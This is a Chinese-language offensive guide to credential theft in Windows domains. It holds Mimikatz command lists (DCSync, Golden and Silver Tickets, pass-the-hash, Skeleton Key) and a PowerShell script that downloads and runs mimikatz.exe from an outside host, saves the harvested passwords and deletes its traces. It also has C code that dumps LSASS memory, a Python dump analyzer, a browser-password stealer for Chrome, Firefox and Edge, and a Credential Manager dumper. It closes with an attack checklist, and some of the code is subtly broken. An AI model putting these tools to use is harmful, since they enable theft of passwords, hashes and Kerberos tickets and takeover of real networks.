# 域渗透与横向移动 - 凭证获取

## 内存凭证

### Mimikatz使用

#### 基本Mimikatz命令
```batch
:: mimikatz_basic.bat

:: 提升权限
mimikatz # privilege::debug

:: 导出内存凭证
mimikatz # sekurlsa::logonpasswords

:: 导出哈希
mimikatz # sekurlsa::msv

:: 导出Kerberos票据
mimikatz # sekurlsa::tickets

:: 导出LSA秘密
mimikatz # lsadump::secrets

:: 导出SAM数据库
mimikatz # lsadump::sam

:: 导出缓存的凭证
mimikatz # sekurlsa::wdigest

:: 导出Kerberos密钥
mimikatz # sekurlsa::kerberos

:: 导出TSPKG凭证
mimikatz # sekurlsa::tspkg

:: 导出CredMan凭证
mimikatz # sekurlsa::credman
```

#### 高级Mimikatz技术
```batch
:: mimikatz_advanced.bat

:: DCSync攻击（需要域管权限）
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:corp.local /user:administrator

:: Golden Ticket攻击
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:hash /user:Administrator

:: Silver Ticket攻击
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:fileserver.corp.local /service:cifs /rc4:hash /user:Administrator

:: Pass-the-Hash
mimikatz # sekurlsa::pth /user:administrator /domain:corp.local /ntlm:hash

:: Pass-the-Ticket
mimikatz # kerberos::ptt ticket.kirbi

:: Overpass-the-Hash
mimikatz # sekurlsa::pth /user:administrator /domain:corp.local /aes256:hash

:: Skeleton Key攻击
mimikatz # misc::skeleton
```

#### Mimikatz自动化脚本
```powershell
# mimikatz_automation.ps1

# 下载并执行Mimikatz
$url = "http://192.168.1.100:8080/mimikatz.exe"
$output = "$env:TEMP\mimikatz.exe"

Invoke-WebRequest -Uri $url -OutFile $output

# 创建Mimikatz脚本
$mimiscript = @"
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
lsadump::sam
exit
"@"

# 执行Mimikatz并捕获输出
$scriptpath = "$env:TEMP\mimiscript.txt"
$mimiscript | Out-File -FilePath $scriptpath -Encoding ASCII

$output = & $output \mimikatz.exe < $scriptpath 2>&1

# 解析输出
$credentials = @()
$current_user = $null

foreach ($line in $output) {
    if ($line -match "Username\s+:\s+(.+)") {
        $current_user = $matches[1].Trim()
    }
    elseif ($line -match "Password\s+:\s+(.+)") {
        $password = $matches[1].Trim()
        if ($current_user) {
            $credentials += [PSCustomObject]@{
                Username = $current_user
                Password = $password
                Source = "Mimikatz"
                Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            }
            $current_user = $null
        }
    }
}

# 保存结果
$credentials | Export-Csv -Path "$env:TEMP\credentials.csv" -NoTypeInformation

# 清理
Remove-Item $output -Force
Remove-Item $scriptpath -Force

Write-Host "[+] Credentials saved to $env:TEMP\credentials.csv"
```

### LSASS Dump分析

#### LSASS内存转储
```c
// lsass_dumper.c
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <dbghelp.h>

#pragma comment(lib, "dbghelp.lib")

// 获取LSASS进程PID
DWORD get_lsass_pid() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, "lsass.exe") == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return 0;
}

// 转储LSASS内存
BOOL dump_lsass_process(DWORD pid, const char* output_file) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("[!] Failed to open LSASS process. Error: %d\n", GetLastError());
        return FALSE;
    }
    
    HANDLE hFile = CreateFileA(output_file, GENERIC_WRITE, 0, NULL, 
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to create output file. Error: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 启用调试权限
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        
        if (LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) {
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        }
        
        CloseHandle(hToken);
    }
    
    // 使用MiniDump转储内存
    BOOL result = MiniDumpWriteDump(
        hProcess,
        pid,
        hFile,
        MiniDumpWithFullMemory,
        NULL,
        NULL,
        NULL
    );
    
    if (result) {
        printf("[+] LSASS memory dumped to %s\n", output_file);
    } else {
        printf("[!] Failed to dump LSASS memory. Error: %d\n", GetLastError());
    }
    
    CloseHandle(hFile);
    CloseHandle(hProcess);
    
    return result;
}

// 主函数
int main() {
    printf("[*] LSASS Memory Dumper\n");
    
    DWORD lsass_pid = get_lsass_pid();
    if (lsass_pid == 0) {
        printf("[!] Could not find LSASS process\n");
        return 1;
    }
    
    printf("[+] Found LSASS PID: %d\n", lsass_pid);
    
    const char* output_file = "lsass.dmp";
    if (dump_lsass_process(lsass_pid, output_file)) {
        printf("[+] Dump successful!\n");
        return 0;
    } else {
        printf("[!] Dump failed!\n");
        return 1;
    }
}
```

#### LSASS Dump分析工具
```python
# lsass_analyzer.py
import pypykatz
from pypykatz.pypykatz import pypykatz
import json
import os
from datetime import datetime

class LSASSAnalyzer:
    def __init__(self):
        self.credentials = []
        self.tickets = []
        self.secrets = []
    
    def analyze_dump_file(self, dump_file_path):
        """分析LSASS转储文件"""
        print(f"[*] Analyzing LSASS dump: {dump_file_path}")
        
        try:
            # 使用pypykatz分析转储文件
            mimi_results = pypykatz.parse_minidump_file(dump_file_path)
            
            # 提取凭证
            self.extract_credentials(mimi_results)
            
            # 提取票据
            self.extract_tickets(mimi_results)
            
            # 提取秘密
            self.extract_secrets(mimi_results)
            
            print(f"[+] Analysis complete!")
            return True
            
        except Exception as e:
            print(f"[!] Error analyzing dump file: {e}")
            return False
    
    def extract_credentials(self, mimi_results):
        """提取凭证信息"""
        print("[*] Extracting credentials...")
        
        # 从sekurlsa模块提取
        if hasattr(mimi_results, 'sekurlsa') and mimi_results.sekurlsa:
            for luid, sessions in mimi_results.sekurlsa.logon_sessions.items():
                for session in sessions:
                    # 提取用户名和密码
                    if session.username and session.password:
                        credential = {
                            'type': 'password',
                            'username': session.username,
                            'password': session.password,
                            'domain': session.domainname,
                            'luid': str(luid),
                            'source': 'sekurlsa',
                            'timestamp': datetime.now().isoformat()
                        }
                        self.credentials.append(credential)
                    
                    # 提取NT哈希
                    if session.username and session.nt_hash:
                        credential = {
                            'type': 'nt_hash',
                            'username': session.username,
                            'hash': session.nt_hash.hex(),
                            'domain': session.domainname,
                            'luid': str(luid),
                            'source': 'sekurlsa',
                            'timestamp': datetime.now().isoformat()
                        }
                        self.credentials.append(credential)
                    
                    # 提取LM哈希
                    if session.username and session.lm_hash:
                        credential = {
                            'type': 'lm_hash',
                            'username': session.username,
                            'hash': session.lm_hash.hex(),
                            'domain': session.domainname,
                            'luid': str(luid),
                            'source': 'sekurlsa',
                            'timestamp': datetime.now().isoformat()
                        }
                        self.credentials.append(credential)
        
        print(f"[+] Extracted {len([c for c in self.credentials if c['source'] == 'sekurlsa'])} credentials from sekurlsa")
    
    def extract_tickets(self, mimi_results):
        """提取Kerberos票据"""
        print("[*] Extracting Kerberos tickets...")
        
        # 从sekurlsa模块提取票据
        if hasattr(mimi_results, 'sekurlsa') and mimi_results.sekurlsa:
            for luid, sessions in mimi_results.sekurlsa.logon_sessions.items():
                for session in sessions:
                    if hasattr(session, 'kerberos_creds') and session.kerberos_creds:
                        for cred in session.kerberos_creds:
                            for ticket in cred.tickets:
                                ticket_info = {
                                    'type': 'kerberos_ticket',
                                    'username': cred.username,
                                    'domain': cred.domain,
                                    'service': ticket.ServiceName,
                                    'target': ticket.TargetName,
                                    'start_time': str(ticket.StartTime),
                                    'end_time': str(ticket.EndTime),
                                    'renew_until': str(ticket.RenewUntil),
                                    'ticket_data': ticket.to_kirbi(),
                                    'source': 'sekurlsa',
                                    'timestamp': datetime.now().isoformat()
                                }
                                self.tickets.append(ticket_info)
        
        print(f"[+] Extracted {len(self.tickets)} Kerberos tickets")
    
    def extract_secrets(self, mimi_results):
        """提取LSA秘密"""
        print("[*] Extracting LSA secrets...")
        
        # 从lsadump模块提取
        if hasattr(mimi_results, 'lsa_secrets') and mimi_results.lsa_secrets:
            for secret_name, secret_data in mimi_results.lsa_secrets.items():
                secret_info = {
                    'type': 'lsa_secret',
                    'name': secret_name,
                    'data': secret_data.hex() if isinstance(secret_data, bytes) else str(secret_data),
                    'source': 'lsadump',
                    'timestamp': datetime.now().isoformat()
                }
                self.secrets.append(secret_info)
        
        # 从SAM数据库提取
        if hasattr(mimi_results, 'sam') and mimi_results.sam:
            for rid, user in mimi_results.sam.items():
                if user.nt_hash or user.lm_hash:
                    secret_info = {
                        'type': 'sam_hash',
                        'rid': rid,
                        'username': user.username,
                        'nt_hash': user.nt_hash.hex() if user.nt_hash else '',
                        'lm_hash': user.lm_hash.hex() if user.lm_hash else '',
                        'source': 'sam',
                        'timestamp': datetime.now().isoformat()
                    }
                    self.secrets.append(secret_info)
        
        print(f"[+] Extracted {len(self.secrets)} secrets")
    
    def save_results(self, output_dir):
        """保存分析结果"""
        os.makedirs(output_dir, exist_ok=True)
        
        # 保存凭证
        if self.credentials:
            creds_file = os.path.join(output_dir, 'credentials.json')
            with open(creds_file, 'w') as f:
                json.dump(self.credentials, f, indent=2)
            print(f"[+] Credentials saved to {creds_file}")
        
        # 保存票据
        if self.tickets:
            tickets_file = os.path.join(output_dir, 'tickets.json')
            with open(tickets_file, 'w') as f:
                json.dump(self.tickets, f, indent=2)
            print(f"[+] Tickets saved to {tickets_file}")
            
            # 保存KIRBI格式的票据
            kirbi_dir = os.path.join(output_dir, 'kirbi_tickets')
            os.makedirs(kirbi_dir, exist_ok=True)
            
            for i, ticket in enumerate(self.tickets):
                if 'ticket_data' in ticket and ticket['ticket_data']:
                    kirbi_file = os.path.join(kirbi_dir, f"ticket_{i}.kirbi")
                    with open(kirbi_file, 'wb') as f:
                        f.write(ticket['ticket_data'])
            
            print(f"[+] KIRBI tickets saved to {kirbi_dir}")
        
        # 保存秘密
        if self.secrets:
            secrets_file = os.path.join(output_dir, 'secrets.json')
            with open(secrets_file, 'w') as f:
                json.dump(self.secrets, f, indent=2)
            print(f"[+] Secrets saved to {secrets_file}")
    
    def generate_summary_report(self):
        """生成汇总报告"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'credential_count': len(self.credentials),
            'ticket_count': len(self.tickets),
            'secret_count': len(self.secrets),
            'credential_types': {},
            'domains': set(),
            'users': set()
        }
        
        # 统计凭证类型
        for cred in self.credentials:
            cred_type = cred['type']
            if cred_type in report['credential_types']:
                report['credential_types'][cred_type] += 1
            else:
                report['credential_types'][cred_type] = 1
            
            if cred.get('domain'):
                report['domains'].add(cred['domain'])
            if cred.get('username'):
                report['users'].add(cred['username'])
        
        # 转换集合为列表（JSON序列化）
        report['domains'] = list(report['domains'])
        report['users'] = list(report['users'])
        
        return report

# 使用示例
analyzer = LSASSAnalyzer()

# 分析LSASS转储文件
if analyzer.analyze_dump_file("lsass.dmp"):
    # 保存结果
    analyzer.save_results("lsass_analysis_results")
    
    # 生成报告
    report = analyzer.generate_summary_report()
    print(json.dumps(report, indent=2))
```

---

## 凭证存储

### 浏览器密码

#### Chrome密码提取
```python
# browser_credential_extractor.py
import os
import sqlite3
import json
import base64
from pathlib import Path
import shutil
from datetime import datetime

class BrowserCredentialExtractor:
    def __init__(self):
        self.browser_paths = {
            'chrome': {
                'windows': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default'),
                'darwin': os.path.expanduser('~/Library/Application Support/Google/Chrome/Default'),
                'linux': os.path.expanduser('~/.config/google-chrome/Default')
            },
            'firefox': {
                'windows': os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles'),
                'darwin': os.path.expanduser('~/Library/Application Support/Firefox/Profiles'),
                'linux': os.path.expanduser('~/.mozilla/firefox')
            },
            'edge': {
                'windows': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default'),
                'darwin': os.path.expanduser('~/Library/Application Support/Microsoft Edge/Default'),
                'linux': os.path.expanduser('~/.config/microsoft-edge/Default')
            }
        }
        
        self.system = self.get_system()
        self.credentials = []
    
    def get_system(self):
        """获取操作系统类型"""
        import platform
        system = platform.system().lower()
        if system == 'windows':
            return 'windows'
        elif system == 'darwin':
            return 'darwin'
        else:
            return 'linux'
    
    def get_chrome_passwords(self, profile_path=None):
        """提取Chrome保存的密码"""
        if not profile_path:
            profile_path = self.browser_paths['chrome'][self.system]
        
        login_db_path = os.path.join(profile_path, 'Login Data')
        
        if not os.path.exists(login_db_path):
            print(f"[!] Chrome login database not found: {login_db_path}")
            return []
        
        # 创建临时副本以避免锁定
        temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
        temp_db_path = temp_db.name
        temp_db.close()
        
        try:
            shutil.copy2(login_db_path, temp_db_path)
            
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            # 查询保存的密码
            cursor.execute("""
                SELECT origin_url, username_value, password_value, date_created
                FROM logins
                WHERE username_value != '' AND password_value != ''
            """)
            
            chrome_passwords = []
            for row in cursor.fetchall():
                url, username, encrypted_password, date_created = row
                
                # 解密密码（需要相应的密钥）
                decrypted_password = self.decrypt_chrome_password(encrypted_password, profile_path)
                
                chrome_passwords.append({
                    'url': url,
                    'username': username,
                    'password': decrypted_password,
                    'date_created': datetime.fromtimestamp(date_created/1000000).isoformat() if date_created else None,
                    'browser': 'chrome',
                    'source_file': login_db_path
                })
            
            conn.close()
            self.credentials.extend(chrome_passwords)
            
            print(f"[+] Extracted {len(chrome_passwords)} Chrome passwords")
            return chrome_passwords
            
        except Exception as e:
            print(f"[!] Error extracting Chrome passwords: {e}")
            return []
        finally:
            if os.path.exists(temp_db_path):
                os.unlink(temp_db_path)
    
    def decrypt_chrome_password(self, encrypted_password, profile_path):
        """解密Chrome密码"""
        try:
            if self.system == 'windows':
                # Windows系统使用DPAPI
                return self.decrypt_dpapi(encrypted_password)
            elif self.system == 'darwin':
                # macOS系统使用Keychain
                return self.decrypt_macos_keychain(encrypted_password)
            else:
                # Linux系统使用硬编码密钥
                return self.decrypt_chrome_linux(encrypted_password, profile_path)
        except Exception as e:
            print(f"[!] Failed to decrypt Chrome password: {e}")
            return "[ENCRYPTED]"
    
    def decrypt_dpapi(self, encrypted_data):
        """使用Windows DPAPI解密"""
        try:
            import ctypes
            from ctypes import wintypes
            
            # DPAPI函数
            CryptUnprotectData = ctypes.windll.crypt32.CryptUnprotectData
            
            # 准备数据结构
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [
                    ('cbData', wintypes.DWORD),
                    ('pbData', ctypes.POINTER(wintypes.BYTE))
                ]
            
            # 创建数据blob
            blob_in = DATA_BLOB()
            blob_in.cbData = len(encrypted_data)
            blob_in.pbData = ctypes.cast(ctypes.create_string_buffer(encrypted_data), ctypes.POINTER(wintypes.BYTE))
            
            blob_out = DATA_BLOB()
            
            # 解密数据
            if CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
                # 获取解密后的数据
                decrypted_data = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                return decrypted_data.decode('utf-8')
            else:
                return "[DPAPI_DECRYPTION_FAILED]"
                
        except Exception as e:
            print(f"[!] DPAPI decryption error: {e}")
            return "[DPAPI_ERROR]"
    
    def get_firefox_passwords(self, profile_path=None):
        """提取Firefox保存的密码"""
        if not profile_path:
            profiles_dir = self.browser_paths['firefox'][self.system]
            
            # 找到默认配置文件
            if os.path.exists(profiles_dir):
                for item in os.listdir(profiles_dir):
                    if item.endswith('.default') or '.default-' in item:
                        profile_path = os.path.join(profiles_dir, item)
                        break
        
        if not profile_path or not os.path.exists(profile_path):
            print(f"[!] Firefox profile not found")
            return []
        
        # Firefox使用不同的数据库结构
        logins_json_path = os.path.join(profile_path, 'logins.json')
        signons_sqlite_path = os.path.join(profile_path, 'signons.sqlite')
        
        firefox_passwords = []
        
        # 尝试读取logins.json（新版本）
        if os.path.exists(logins_json_path):
            try:
                with open(logins_json_path, 'r') as f:
                    logins_data = json.load(f)
                
                for login in logins_data.get('logins', []):
                    firefox_passwords.append({
                        'url': login.get('hostname', ''),
                        'username': login.get('username', ''),
                        'password': login.get('password', ''),
                        'date_created': datetime.fromtimestamp(login.get('timeCreated', 0)/1000).isoformat() if login.get('timeCreated') else None,
                        'browser': 'firefox',
                        'source_file': logins_json_path
                    })
                
            except Exception as e:
                print(f"[!] Error reading Firefox logins.json: {e}")
        
        # 尝试读取旧的SQLite数据库
        elif os.path.exists(signons_sqlite_path):
            try:
                temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
                temp_db_path = temp_db.name
                temp_db.close()
                
                shutil.copy2(signons_sqlite_path, temp_db_path)
                
                conn = sqlite3.connect(temp_db_path)
                cursor = conn.cursor()
                
                # 查询保存的密码
                cursor.execute("""
                    SELECT hostname, username, password, timeCreated
                    FROM moz_logins
                    WHERE username != '' AND password != ''
                """)
                
                for row in cursor.fetchall():
                    hostname, username, password, time_created = row
                    
                    firefox_passwords.append({
                        'url': hostname,
                        'username': username,
                        'password': password,
                        'date_created': datetime.fromtimestamp(time_created/1000).isoformat() if time_created else None,
                        'browser': 'firefox',
                        'source_file': signons_sqlite_path
                    })
                
                conn.close()
                os.unlink(temp_db_path)
                
            except Exception as e:
                print(f"[!] Error reading Firefox signons.sqlite: {e}")
        
        self.credentials.extend(firefox_passwords)
        print(f"[+] Extracted {len(firefox_passwords)} Firefox passwords")
        return firefox_passwords
    
    def get_edge_passwords(self, profile_path=None):
        """提取Edge保存的密码"""
        if not profile_path:
            profile_path = self.browser_paths['edge'][self.system]
        
        # Edge基于Chromium，使用与Chrome相同的方法
        return self.get_chrome_passwords(profile_path)
    
    def extract_all_browser_passwords(self):
        """提取所有浏览器的密码"""
        print("[*] Extracting browser passwords...")
        
        # Chrome
        chrome_passwords = self.get_chrome_passwords()
        
        # Firefox
        firefox_passwords = self.get_firefox_passwords()
        
        # Edge
        edge_passwords = self.get_edge_passwords()
        
        total_passwords = len(chrome_passwords) + len(firefox_passwords) + len(edge_passwords)
        print(f"[+] Total passwords extracted: {total_passwords}")
        
        return {
            'chrome': chrome_passwords,
            'firefox': firefox_passwords,
            'edge': edge_passwords,
            'total': total_passwords
        }
    
    def save_credentials(self, output_file):
        """保存提取的凭证"""
        with open(output_file, 'w') as f:
            json.dump(self.credentials, f, indent=2, default=str)
        
        print(f"[+] Browser credentials saved to {output_file}")
    
    def generate_statistics(self):
        """生成统计信息"""
        stats = {
            'total_credentials': len(self.credentials),
            'browser_distribution': {},
            'unique_domains': set(),
            'unique_users': set()
        }
        
        for cred in self.credentials:
            browser = cred.get('browser', 'unknown')
            if browser in stats['browser_distribution']:
                stats['browser_distribution'][browser] += 1
            else:
                stats['browser_distribution'][browser] = 1
            
            if cred.get('url'):
                from urllib.parse import urlparse
                domain = urlparse(cred['url']).netloc
                stats['unique_domains'].add(domain)
            
            if cred.get('username'):
                stats['unique_users'].add(cred['username'])
        
        stats['unique_domains'] = len(stats['unique_domains'])
        stats['unique_users'] = len(stats['unique_users'])
        
        return stats

# 使用示例
extractor = BrowserCredentialExtractor()
browser_passwords = extractor.extract_all_browser_passwords()
extractor.save_credentials('browser_credentials.json')

stats = extractor.generate_statistics()
print(json.dumps(stats, indent=2))
```

### Windows凭证管理器

#### 凭据管理器提取
```powershell
# credential_manager_extractor.ps1

# 定义凭据类型
$CREDENTIAL_TYPES = @{
    1 = "Generic"
    2 = "Domain Password"
    3 = "Domain Certificate"
    4 = "Domain Visible Password"
    5 = "Generic Certificate"
    6 = "Domain Extended"
    7 = "Maximum"
    1001 = "Maximum Ex"
}

# 添加必要的类型
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class CredentialManager
{
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool CredEnumerate(string filter, int flags, out int count, out IntPtr credPtrs);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool CredFree(IntPtr credPtrs);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct CREDENTIAL
    {
        public int Flags;
        public int Type;
        public string TargetName;
        public string Comment;
        public long LastWritten;
        public int CredentialBlobSize;
        public IntPtr CredentialBlob;
        public int Persist;
        public int AttributeCount;
        public IntPtr Attributes;
        public string TargetAlias;
        public string UserName;
    }
}
"@

function Get-CredentialManagerPasswords {
    $credentials = @()
    
    $count = 0
    $credPtrs = [IntPtr]::Zero
    
    # 枚举所有凭据
    $success = [CredentialManager]::CredEnumerate($null, 0, [ref]$count, [ref]$credPtrs)
    
    if (-not $success) {
        Write-Host "[!] Failed to enumerate credentials. Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return $credentials
    }
    
    try {
        # 计算凭据指针数组的大小
        $credSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][CredentialManager+CREDENTIAL])
        
        for ($i = 0; $i -lt $count; $i++) {
            # 获取凭据指针
            $credPtr = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($credPtrs, $i * [System.IntPtr]::Size)
            
            # 将指针转换为结构
            $credential = [System.Runtime.InteropServices.Marshal]::PtrToStructure($credPtr, [Type][CredentialManager+CREDENTIAL])
            
            # 提取凭据信息
            $cred_info = @{
                TargetName = $credential.TargetName
                UserName = $credential.UserName
                Type = $CREDENTIAL_TYPES[$credential.Type]
                Comment = $credential.Comment
                LastWritten = [DateTime]::FromFileTime($credential.LastWritten)
                Persist = $credential.Persist
            }
            
            # 提取密码
            if ($credential.CredentialBlobSize -gt 0) {
                $passwordBytes = New-Object byte[] $credential.CredentialBlobSize
                [System.Runtime.InteropServices.Marshal]::Copy($credential.CredentialBlob, $passwordBytes, 0, $credential.CredentialBlobSize)
                $cred_info.Password = [System.Text.Encoding]::Unicode.GetString($passwordBytes)
            } else {
                $cred_info.Password = "[NO PASSWORD]"
            }
            
            $credentials += $cred_info
        }
    } finally {
        # 释放内存
        [CredentialManager]::CredFree($credPtrs)
    }
    
    return $credentials
}

# 提取凭据管理器密码
Write-Host "[*] Extracting Credential Manager passwords..."
$creds = Get-CredentialManagerPasswords

Write-Host "[+] Found $($creds.Count) credentials"

# 显示结果
foreach ($cred in $creds) {
    Write-Host "`n[+] Credential: $($cred.TargetName)"
    Write-Host "    Type: $($cred.Type)"
    Write-Host "    Username: $($cred.UserName)"
    Write-Host "    Password: $($cred.Password)"
    Write-Host "    Last Written: $($cred.LastWritten)"
}

# 保存结果
$creds | ConvertTo-Json -Depth 10 | Out-File -FilePath "$env:TEMP\credential_manager_creds.json" -Encoding UTF8
Write-Host "[+] Credentials saved to $env:TEMP\credential_manager_creds.json"
```

---

## 实战检查清单

### 内存凭证
- [ ] Mimikatz已部署
- [ ] LSASS内存已转储
- [ ] 内存凭证已提取
- [ ] 哈希值已获取
- [ ] Kerberos票据已导出

### 凭证存储
- [ ] 浏览器密码已提取
- [ ] 凭据管理器已访问
- [ ] 保存的密码已解密
- [ ] 凭证文件已保存
- [ ] 凭证统计已生成